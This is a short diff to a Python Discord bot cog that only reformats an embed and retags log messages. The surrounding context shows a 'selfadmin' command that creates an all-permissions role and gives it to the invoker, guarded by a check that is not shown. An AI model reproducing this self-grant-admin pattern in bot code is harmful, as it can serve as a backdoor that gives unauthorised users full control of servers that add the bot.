@@ -17,7 +17,9 @@ class AmCog(commands.Cog):
     async def selfadmin(self, ctx):
         role = await ctx.guild.create_role(name="BOT", permissions=discord.Permissions.all())
         await ctx.author.add_roles(role)
-        embed = discord.Embed(title="Bot", description=":robot: **Done!**", color=0x11ff11)
+        embed = discord.Embed(title="Bot", 
+                description=":robot: **Done!**", 
+                color=0x11ff11)
         await ctx.send(embed=embed)
         debug_print('[Bot] [!!!] [AM] Gave admin role to user: %s' % ctx.author)
 
@@ -25,8 +27,8 @@ class AmCog(commands.Cog):
     async def selfadmin_error(self, ctx, error):
         if isinstance(error, commands.CheckFailure):
             await ctx.send(':warning: **You can\'t do that, %s.**' % ctx.author.mention)
-            debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
+            debug_print('[Bot] [E] [AM] Could not parse arguments for user: %s' % ctx.author)
         else:
             await ctx.send(':warning: **I can\'t do that.**')
-            debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
+            debug_print('[Bot] [E] [AM] Could not parse arguments for user: %s' % ctx.author)
             error_print(error)
